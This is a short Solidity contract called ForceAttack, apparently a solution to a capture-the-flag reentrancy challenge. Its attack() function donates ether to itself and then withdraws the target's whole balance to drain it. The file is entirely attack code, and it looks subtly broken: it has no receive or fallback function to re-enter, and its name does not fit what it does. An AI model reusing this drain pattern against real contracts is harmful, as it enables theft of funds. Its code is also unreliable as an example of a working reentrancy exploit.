//"SPDX-License-Identifier: MIT"
pragma solidity ^0.8.7;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ForceAttack {
  IReentrance reentrance;

  constructor(IReentrance _reentrance) public {
    reentrance = _reentrance;
  }

  function attack() external payable {
    reentrance.donate(address(this));
    reentrance.withdraw(address(reentrance).balance);
  }
}